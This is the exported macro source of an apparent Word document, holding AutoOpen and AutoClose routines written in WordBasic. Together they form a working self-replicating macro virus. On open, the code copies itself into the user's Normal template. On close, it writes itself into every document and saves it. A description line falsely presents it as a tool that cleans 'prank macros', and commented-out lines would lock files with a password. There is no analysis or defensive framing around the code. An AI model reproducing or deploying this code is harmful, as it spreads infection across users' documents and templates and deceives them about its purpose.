   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"


   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim sMe$
   Dim sMacro$
   WordBasic.MsgBox "Hi", "India"
   WordBasic.MsgBox WordBasic.[MacroFileName$]()
   WordBasic.DisableAutoMacros 0
   On Error GoTo -1: On Error GoTo Abort

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg

   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   'dlg.Password = "India"
   'dlg.WritePassword = "India"
   'FileSaveAs dlg
   '--------------------------------------------------------

   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", sMacro$
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AutoOpen", sMacro$
   WordBasic.FileSaveAs dlg

   Abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim sMe$
   Dim sMacro$

   sMe$ = WordBasic.[FileName$]()
   WordBasic.MsgBox WordBasic.[MacroFileName$]()
   sMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy sMacro$, "Global:AutoOpen"

   End Sub
